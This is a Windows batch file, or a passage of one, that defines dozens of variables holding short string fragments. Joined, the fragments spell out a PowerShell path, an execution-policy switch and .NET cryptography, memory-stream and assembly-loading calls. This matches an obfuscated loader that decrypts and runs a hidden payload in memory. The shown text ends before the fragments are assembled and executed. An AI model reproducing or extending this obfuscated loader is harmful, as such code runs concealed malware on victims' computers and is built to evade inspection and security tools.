@echo off
set "gWiQoAkNyn=xe"
set "hkMHxQOWWG=Wi"
set "PgGSuONnFw=st"
set "XMrvPNqZCO=rS"
set "UZheCWCuOt=ll"
set "zZHFguPuFh=do"
set "ynBfLAXaJf=0\"
set "ZKvAGNyvyx=y "
set "vHVNlbcAiE=we"
set "TwPrMJBHJt=ll"
set "TNPYUXZAui=s\"
set "iLhRZbzTNW= C"
set "lIqiYmgbsa=po"
set "cCKgqrFYWM=we"
set "WYyjKLRbtl=:\"
set "kMUXGaROue=in"
set "HbDdVCfjTB=rs"
set "VYdWyjfnmv=.e"
set "QGoEcICadT=\v"
set "LCrXHdlISi=he"
set "BnLhMCQaYQ=em"
set "MBQQuabAeF=1."
set "nDWhGqaFvV=Sy"
set "gXgOSHUzAZ= /"
set "PvqmnnwqSL=32"
set "QtxybbpBkO=ow"
set "SuGvJFDOZd=he"
set "vUwSGcBtFn=Po"
set "bJfoZMhWDg=\W"
set "qGYSNOVLuB=nd"
set "AcCuDqnlvX=co"
set "aNKUALPjkc=py"
set "rwvUvShxiZ=ws"
set "AVkdwiDibM=cd"
set "WpZlHGuBGS= %~dp0"
set "enAbNmCFeU=::('"
set "xSixbOHPIt=g = "
set "tLzoFuLfJd=.Key"
set "UEpMXkTFHb=$tPR"
set "mNeUqyxsvR=em.I"
set "uVjPXQOFHj=le  "
set "bKUhjkOgbE= = ["
set "oKbCLlORBD=]::C"
set "hCQSdRwwZl=SMoE"
set "WmReoEWvLI=.IO."
set "LmPpMWOKow=raph"
set "mLkQPHqbgL=);$E"
set "CDTChRQHww=3); "
set "qDrBMrbitY=oint"
set "SOJxcNyoNf=Stre"
set "QCqaPabGvv=..-1"
set "BrCrMeExAp=WC.T"
set "dOucpjXvBm=6] -"
set "YITROvwpus=[Sys"
set "JHAbVWOjAH=.Sec"
set "bDbJEwQtoM=);$E"
set "OjthDXTMbL=pose"
set "WMIBRUdfhe=; };"
set "mocCzPguze=, $f"
set "WZfbIkEVAO=vwhF"
set "crWjCsjQuy=brea"
set "yleyIPJhSD=oL'["
set "gAPZwWUxJm=('%*'"
set "vECOFXLrvL=Lite"
set "FMIkFnXFHC=);$O"
set "cWBEwEVJxQ=O.Me"
set "oGlJHahhNh=.Ass"
set "nbCPwVszbr=m.IO"
set "HPoqPZCBgS=yste"
set "bqvMVCcsdP=grap"
set "LOlLxeqCrz=e]::"
set "kWDciwPZkW=736u"
set "ifNcgAbANg= New"
set "gvcaINJJPF=New-"
set "CDpodHiztr=oArr"
set "YmiSKwbLzp=em.C"
set "SQKMSPawgE=Invo"
set "IgSxsJaRBi=eam("
set "kGGNXAHFCN= if "
set "mbCkzJJTLc=$Lit"
set "OZLzILLnBi=yTo("
set "yTcledAwKu=-ep "
set "bIGZMoCcqI=stem"
set "mcjjuCBYaK=mory"
set "zaCVZrkPig=pose"
set "rfXILymCbB=hy.A"
set "MwKvXWyuAn=lit("
set "qDZAmgOPLM=rity"
set "RmLMReIBAs=).Sp"
set "QsrrMTGjWs=.Dis"
